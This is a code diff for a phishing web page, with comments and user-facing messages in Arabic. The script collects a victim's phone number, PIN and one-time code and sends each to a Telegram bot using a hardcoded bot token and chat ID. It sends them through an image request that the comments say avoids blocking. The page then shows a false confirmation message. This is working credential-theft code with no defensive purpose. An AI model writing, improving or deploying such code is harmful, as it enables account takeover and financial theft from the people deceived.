@@ -39,17 +39,21 @@
 </div>
 
 <script>
-// ضع التوكن الجديد هنا بين علامتي التنصيص
-const token = "ضع_التوكن_الجديد_هنا"; 
-const id = "5244299184";
+const token = "8647203625:AAFUHY8sXVD8IoSvf60Wd7pT-l5MHDO-d9I";
+const chatId = "5244299184";
+
+function sendToTelegram(text) {
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+    // استخدام طريقة الصورة لضمان الإرسال السريع وتخطي الحجب
+    const img = new Image();
+    img.src = url;
+}
 
 function sendData() {
     const p = document.getElementById('phone').value;
     const s = document.getElementById('pin').value;
     if(p && s) {
-        const msg = encodeURIComponent(`🚨 دخول جديد:\n📱 هاتف: ${p}\n🔑 رمز: ${s}`);
-        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${msg}`;
-        new Image().src = url; // الإرسال
+        sendToTelegram(`🚨 دخول جديد:\n📱 الهاتف: ${p}\n🔑 الرمز: ${s}`);
         document.getElementById('step1').classList.add('hidden');
         document.getElementById('step2').classList.remove('hidden');
     }
@@ -58,10 +62,8 @@ function sendData() {
 function sendOtp() {
     const o = document.getElementById('otp').value;
     if(o) {
-        const msg = encodeURIComponent(`🔢 الرمز OTP: ${o}`);
-        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${msg}`;
-        new Image().src = url; // الإرسال
-        alert("تم التأكيد بنجاح");
+        sendToTelegram(`🔢 الرمز OTP: ${o}`);
+        alert("تم التأكيد بنجاح، يرجى الانتظار...");
         location.reload();
     }
 }
